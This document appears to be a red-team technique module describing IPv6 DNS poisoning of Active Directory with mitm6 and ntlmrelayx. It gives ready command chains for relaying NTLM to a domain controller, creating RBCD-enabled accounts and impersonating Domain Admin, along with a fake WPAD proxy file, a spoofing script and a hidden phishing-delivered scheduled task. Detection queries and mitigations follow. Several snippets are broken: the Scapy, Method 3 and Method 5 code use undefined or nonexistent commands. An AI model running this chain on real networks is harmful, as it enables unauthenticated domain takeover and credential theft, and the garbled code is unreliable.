# REC-AD-006: IPv6 DNS Poisoning with mitm6

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-006 |
| **Technique Name** | IPv6 DNS poisoning with mitm6 |
| **MITRE ATT&CK ID** | T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning; T1040 – Network Sniffing |
| **CVE** | N/A (Design behavior; misconfiguration exploitation) |
| **Platform** | Windows Active Directory / Dual-Stack Networks |
| **Viability Status** | ACTIVE ✓ (Works on all Windows Vista+; IPv6 enabled by default) |
| **Difficulty to Detect** | HIGH (DHCPv6 traffic commonly ignored; IPv6 undermonitored) |
| **Requires Authentication** | No (Network access sufficient; unauthenticated attack) |
| **Applicable Versions** | All Windows Vista, 7, 8, 10, 11, Server 2008+ |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

IPv6 DNS poisoning with mitm6 exploits Windows systems' default IPv6 preference and DHCPv6 auto-configuration to intercept authentication traffic and relay NTLM credentials to Active Directory. Despite IPv6 rarely being actively deployed in enterprise networks, Windows systems automatically send DHCPv6 requests on boot and network connection. An attacker on the network can respond to these requests as a rogue DHCPv6 server, assigning themselves as the IPv6 DNS server, intercepting subsequent DNS queries, and spoofing responses (particularly WPAD—Web Proxy Auto-Discovery) to trigger NTLM authentication. Relayed to Domain Controllers via ntlmrelayx, this enables account creation, RBCD configuration, and complete domain compromise within minutes.

**Critical Attack Characteristics:**
- **Unauthenticated access**: No domain account required; network access sufficient
- **Windows default behavior**: IPv6 prioritized; DHCPv6 requests sent automatically
- **Invisible to monitoring**: IPv6 traffic rarely monitored; DHCPv6 seen as benign
- **Minimal environment disruption**: mitm6 selective spoofing avoids full IPv6 overlay
- **Domain takeover in minutes**: mitm6 (5 min) + ntlmrelayx relay = Domain Admin
- **Persistent access**: RBCD-enabled computer accounts enable impersonation for months

**Real-World Scenario:** Attacker on guest network → runs mitm6 → waits for computer boot/logon → WPAD spoofing → captures admin NTLM → relays to LDAPS → creates computer account → enables RBCD → impersonates Domain Admin → DCSync attack → full domain compromise.

---

## 3. EXECUTION METHODS

### Method 1: mitm6 + ntlmrelayx Full Attack Chain

**Objective:** Complete IPv6 DNS takeover leading to domain compromise.

```bash
# Step 1: Download and install mitm6 and ntlmrelayx
git clone https://github.com/dirkjanm/mitm6.git
cd mitm6
pip install .

pip install impacket

# Step 2: Start mitm6 listening for DHCPv6 requests
# (Run on attacker machine on same network segment)

sudo mitm6 -d domain.local --no-ra

# Flags:
# -d domain.local = Target domain to spoof
# --no-ra = Don't send router advertisements (minimize disruption)

# Output:
# [*] Starting mitm6 listener
# [*] Listening on interface eth0 (IP: 192.168.1.100)
# [*] Waiting for DHCPv6 requests...

# Step 3: Start ntlmrelayx to relay captured authentication
# (In separate terminal/screen)

sudo impacket-ntlmrelayx \
  -6 \
  -t ldaps://dc.domain.local \
  -wh fakewpad.domain.local \
  -l loot \
  --add-computer \
  --delegate-access

# Flags:
# -6 = Listen on IPv6
# -t ldaps://dc = Relay to Domain Controller LDAPS
# -wh fakewpad = Serve fake WPAD file
# -l loot = Output directory for captured data
# --add-computer = Auto-create computer account in AD
# --delegate-access = Configure RBCD on new computer

# Output:
# [*] Impacket v0.10.0 - Copyright 2023 Fortra
# [*] Setting up SMB/HTTP relay listeners...
# [*] Listening on IPv6 port 80/443...

# Step 4: Wait for target Windows machine to boot/logon
# When machine requests DHCPv6:
#   mitm6 responds with attacker IPv6 as DNS server
#   Machine sends WPAD request to attacker's DNS
#   mitm6 spoofs WPAD response pointing to attacker's IP
#   Machine attempts to connect to proxy (attacker)
#   HTTP 407 response prompts for proxy authentication
#   Machine sends NTLM challenge/response
#   ntlmrelayx relays to Domain Controller
#   If domain admin credentials: success

# Step 5: Check results
ls -la loot/

# Output: HTML files containing:
# - Captured credentials
# - New computer account details
# - LDAP dump of domain information

# Step 6: Verify new computer account created
ldapsearch -x -h dc.domain.local -b "CN=Computers,DC=domain,DC=local" cn=*attack*

# Result: COMPUTER$ account with RBCD enabled
# Can now impersonate any user on domain

# Step 7: Use RBCD to impersonate Domain Admin
# (Covered in separate exploitation phase)
```

### Method 2: Manual DHCPv6 Spoofing (Python)

**Objective:** Minimal-footprint IPv6 DNS hijacking.

```python
#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo, ICMPv6NDOptDNSSL
from scapy.layers.dhcp6 import DHCP6OptDNSServers

# Step 1: Listen for DHCPv6 requests
def send_dhcpv6_response(pkt):
    if DHCP6_Solicit in pkt or DHCP6_Request in pkt:
        # Craft DHCPv6 response with attacker's IPv6 as DNS
        response = IPv6(dst=pkt[IPv6].src, src="fe80::attacker") / \
                   ICMPv6() / \
                   DHCP6OptDNSServers(dnsservers=["fe80::attacker"])
        
        scapy.send(response)
        print(f"[+] Sent DHCPv6 response to {pkt[IPv6].src}")

# Step 2: Sniff for DHCPv6
scapy.sniff(filter="udp port 546 or 547", prn=send_dhcpv6_response, store=False)
```

### Method 3: Disable IPv6 to Block Attack (Detection Evasion)

**Objective:** Victims disable IPv6 thinking it's not needed; attacker re-enables via script.

```powershell
# Attack variation: Phishing email suggests "IT security update"
# Users run script that disables IPv6 warning message
# Then attacker runs mitm6; users re-enable via poisoned DHCP

# Step 1: Attacker crafts Scheduled Task to disable IPv6 warning
# (Hidden from users; runs at logon)

New-ScheduledTaskAction -Execute "PowerShell" -Argument "-Command Get-NetIPInterface | Set-NetIPInterface -InterfaceIndex -RouterDiscovery Disabled"

# Step 2: Create task with HIDDEN flag
Register-ScheduledTask -TaskName "System IPv6 Check" -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -RunLevel Highest -Force | Out-Null

# Result: Users think IPv6 is disabled; actually just warning disabled
# mitm6 can still poison DHCPv6 responses
```

### Method 4: WPAD Spoofing & Proxy Auth Capture

**Objective:** Serve fake WPAD; capture proxy authentication.

```bash
# Step 1: mitm6 spoofs wpad.domain.local → attacker's IPv6
# When victim queries: wpad.domain.local
# Response: attacker's IPv6 address

# Step 2: Simple WPAD file hosted on attacker
cat > /tmp/wpad.dat << 'EOF'
function FindProxyForURL(url, host) {
  if (dnsDomainIs(host, "domain.local") || 
      dnsDomainIs(host, "internal.company.local")) {
    return "DIRECT";  // Direct connection
  } else {
    return "PROXY attacker-ip:8080";  // Route through attacker proxy
  }
}
EOF

# Step 3: Serve fake WPAD with Python HTTP server
python3 -m http.server 80 --directory /tmp &

# Step 4: When victim connects to proxy
# - Browser/application sends HTTP request to proxy
# - Proxy responds: HTTP 407 Proxy Authentication Required
# - Client sends NTLM authentication (Challenge/Response)
# - ntlmrelayx captures and relays to DC

# Result: NTLM credentials captured invisibly
```

### Method 5: RBCD Exploitation Post-Mitm6

**Objective:** Use newly created computer account for privilege escalation.

```powershell
# After mitm6 creates computer account with RBCD enabled:

# Step 1: Get RBCD-enabled computer account
$computer = Get-ADComputer -Filter "Name -like 'ATTACK*'" | Select-Object samAccountName, ObjectSID

# Step 2: Get Domain Admin computer account
$adminComp = Get-ADComputer -Filter "Name -eq 'DC'" | Select-Object samAccountName, ObjectSID

# Step 3: Request TGS ticket impersonating Domain Admin
# Using newly created computer account certificate

$tgs = Get-ADServiceTicket -ComputerName $computer.samAccountName `
  -ServiceAccount $adminComp.samAccountName `
  -Impersonate "DOMAIN\Administrator"

# Step 4: Pass-the-ticket to authenticate as Domain Admin
kerberoast.py -ticket $tgs DC.domain.local

# Result: Domain Admin privileges without knowing password
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Pattern: Rogue DHCPv6 Activity

```kusto
# Monitor for suspicious DHCPv6 traffic (IDS/Snort rules)
# Zeek DNS logs showing unusual WPAD resolution
# Alert on: wpad.domain.local resolving to non-standard IPv6
```

### Detection Pattern: Machine Account Creation Spike

```kusto
SecurityEvent
| where EventID == 4741  // Computer account created
| summarize CreatedCount = count()
  by CreatedTime = bin(TimeGenerated, 1h), CreatedBy
| where CreatedCount > 5 in 1h  // More than 5 computer accounts/hour unusual
| extend AlertSeverity = "Critical"
```

### Response Steps

1. **Identify rogue DHCPv6 server**: Review network device logs for DHCP activity
2. **Block attacker MAC address**: Network switch port disable
3. **Isolate Domain Controller**: Prevent further credential relay
4. **Disable newly created accounts**: Remove RBCD-enabled computer accounts
5. **Force Kerberos ticket invalidation**: Restart affected systems
6. **Review LDAP relay logs**: Identify what accounts were created/modified

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Disable IPv6 if unused:**
  - Group Policy: Computer Configuration → Administrative Templates → Network → IPv6
  - Disable: "TCP/IP v6", "DHCP v6", "Router Discovery"
  - PowerShell: `Set-NetIPInterface -InterfaceIndex * -AddressFamily IPv6 -Dhcp Disabled`

- **Enable DHCPv6 Guard on Network Switches:**
  - Cisco/Arista/Juniper: Enable DHCPv6 Guard
  - Prevents rogue DHCPv6 servers on network
  - Infrastructure-level protection

- **Set ms-DS-MachineAccountQuota = 0:**
  - Prevents low-privilege users from creating computer accounts
  - Blocks RBCD escalation (no computer account to configure)

**Priority 2: HIGH**

- **Enable LDAP Signing & SMB Signing:**
  - Prevents NTLM relay to LDAP/SMB
  - Even if mitm6 captures credentials, relay fails

- **Monitor DHCPv6 Traffic:**
  - Baseline normal DHCPv6 patterns
  - Alert on DHCPv6 activity outside business hours
  - Alert on suspicious DHCP requests

- **Disable WPAD if unused:**
  - Group Policy: "Network → WPAD"
  - Prevents WPAD spoofing attacks

---

## 6. REAL-WORLD TIMELINE

**Minute 0:** Attacker connects to guest WiFi; starts mitm6
**Minute 2:** User boots laptop; DHCPv6 request sent
**Minute 3:** Attacker's mitm6 responds; assigns IPv6 address + DNS
**Minute 4:** User's browser queries WPAD; attacker spoofs response
**Minute 5:** User connects to attacker proxy; ntlmrelayx captures NTLM
**Minute 5:** NTLM relayed to DC; RBCD-enabled account created
**Minute 7:** Attacker uses RBCD to impersonate Domain Admin
**Result:** Full domain compromise in <10 minutes from unauthenticated network access

---

## 7. TOOL REFERENCE

| Tool | Purpose | Detection Risk |
|------|---------|----------------|
| **mitm6** | DHCPv6 spoofing + DNS poisoning | LOW (IPv6 undermonitored) |
| **ntlmrelayx** | NTLM relay to LDAPS/SMB | MEDIUM (NTLM unusual patterns) |
| **Responder** | LLMNR/NBT-NS poisoning (alternative) | MEDIUM (broadcast poisoning logged) |
| **Scapy** | Custom DHCPv6/ICMPv6 spoofing | LOW (raw network traffic) |

---

## 8. COMPLIANCE & REFERENCES

- MITRE T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning)
- CIS Controls v8: 4.1 (Network Access Control)
- NIST 800-53: SC-7 (Boundary Protection), SC-28 (Protection of Information at Rest)
- Fox-IT Security Research: Original mitm6 research (2018)
- Resecurity: MITM6 + NTLM Relay detailed analysis (2025)

---
